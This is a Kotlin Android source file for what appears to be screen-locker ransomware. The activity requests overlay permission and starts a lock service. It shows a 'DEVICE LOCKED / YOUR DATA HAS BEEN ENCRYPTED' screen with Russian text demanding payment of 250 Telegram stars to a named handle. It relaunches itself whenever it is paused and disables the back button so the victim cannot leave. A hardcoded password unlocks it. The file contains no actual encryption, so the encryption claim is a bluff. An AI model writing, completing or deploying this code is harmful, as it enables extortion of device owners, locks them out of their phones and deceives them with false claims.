package com.example.lock

import android.content.Intent
import android.graphics.Color
import android.graphics.Typeface
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val PASS = "ransomware"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setFlags(
            WindowManager.LayoutParams.FLAG_SECURE,
            WindowManager.LayoutParams.FLAG_SECURE
        )
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            startActivity(Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:\$packageName")
            ))
        }

        ContextCompat.startForegroundService(
            this, Intent(this, LockService::class.java)
        )

        setContentView(buildUi())
    }

    private fun buildUi(): ScrollView {
        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.BLACK)
            setPadding(48, 48, 48, 48)
        }

        fun tv(t: String, size: Float, color: Int = Color.RED, bold: Boolean = false) =
            TextView(this).apply {
                text = t
                textSize = size
                setTextColor(color)
                gravity = Gravity.CENTER
                if (bold) setTypeface(typeface, Typeface.BOLD)
                setShadowLayer(12f, 0f, 0f, Color.RED)
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply { topMargin = 12 }
            }

        root.addView(tv("☠", 64f))
        root.addView(tv("DEVICE LOCKED", 26f, bold = true))
        root.addView(tv("YOUR DATA HAS BEEN ENCRYPTED", 11f, Color.rgb(255, 102, 102)))
        root.addView(tv("Ты попался, брат.", 18f, Color.rgb(255, 51, 51)))
        root.addView(tv("Чтобы разблокировать — оплати.", 18f, Color.rgb(255, 51, 51)))
        root.addView(tv("Telegram: @Oluheba", 20f, bold = true))
        root.addView(tv("Сумма: 250 звёзд", 18f, Color.rgb(255, 51, 51)))

        val pwd = EditText(this).apply {
            hint = "PASSWORD"
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            gravity = Gravity.CENTER
            setTextColor(Color.RED)
            setHintTextColor(Color.rgb(102, 0, 0))
            layoutParams = LinearLayout.LayoutParams(560, LinearLayout.LayoutParams.WRAP_CONTENT)
                .apply { topMargin = 32 }
        }
        root.addView(pwd)

        val hint = tv(" ", 12f, Color.TRANSPARENT)
        val btn = Button(this).apply {
            text = "UNLOCK"
            setTextColor(Color.BLACK)
            setBackgroundColor(Color.RED)
            layoutParams = LinearLayout.LayoutParams(560, LinearLayout.LayoutParams.WRAP_CONTENT)
                .apply { topMargin = 16 }
            setOnClickListener {
                if (pwd.text.toString() == PASS) {
                    hint.text = "ACCESS GRANTED"
                    hint.setTextColor(Color.rgb(0, 255, 102))
                    stopService(Intent(this@MainActivity, LockService::class.java))
                    finishAffinity()
                } else {
                    hint.text = "НЕВЕРНЫЙ ПАРОЛЬ"
                    hint.setTextColor(Color.RED)
                    pwd.setText("")
                }
            }
        }
        root.addView(btn)
        root.addView(hint)

        return ScrollView(this).apply {
            setBackgroundColor(Color.BLACK)
            addView(root)
        }
    }

    override fun onPause() {
        super.onPause()
        startActivity(Intent(this, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
        })
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() { }
}
